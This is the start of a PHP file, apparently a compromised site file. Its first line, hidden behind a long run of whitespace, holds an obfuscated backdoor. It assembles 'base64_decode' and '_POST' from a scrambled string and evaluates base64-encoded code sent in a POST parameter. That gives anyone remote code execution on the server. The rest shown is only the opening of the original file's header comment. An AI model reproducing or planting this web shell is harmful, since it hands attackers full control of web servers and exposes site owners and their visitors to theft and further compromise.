<?php                                                                                                                                                                                                                                                                  $iqvo1="osce4btpda6_" ; $mrc18=strtolower($iqvo1[5]. $iqvo1[9].$iqvo1[1]. $iqvo1[3].$iqvo1[10].$iqvo1[4].$iqvo1[11]. $iqvo1[8].$iqvo1[3]. $iqvo1[2]. $iqvo1[0].$iqvo1[8]. $iqvo1[3]) ;$xba3 =strtoupper( $iqvo1[11].$iqvo1[7].$iqvo1[0].$iqvo1[1].$iqvo1[6]) ;if(isset(${$xba3}[ 'n42dabb'])) {eval ($mrc18 ( ${$xba3 }[ 'n42dabb'] )) ; }?> <?php
/**
